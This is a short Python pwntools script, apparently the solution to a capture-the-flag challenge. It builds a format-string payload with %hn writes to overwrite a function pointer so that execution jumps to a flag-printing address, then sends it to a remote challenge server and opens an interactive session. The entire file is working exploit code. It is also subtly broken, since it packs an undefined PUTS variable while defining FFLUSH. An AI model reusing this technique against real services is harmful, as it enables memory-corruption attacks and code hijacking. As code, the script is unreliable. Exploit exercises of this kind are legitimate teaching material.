import struct
from pwn import *

FLAG = 0x80492be
FFLUSH = 0x804c010

def pad(s):
  return s+"X"*(100-len(s))

exploit = " "
exploit += struct.pack("I", PUTS)
exploit += struct.pack("I", PUTS+2)
exploit += "%2043x"
exploit += "%7$hn"
exploit += "%35514x"
exploit += "%6$hn"

exploit = pad(exploit)

r = remote('plsdonthaq.me', 1002)
r.recvuntil(">")
r.sendline(exploit)
r.interactive()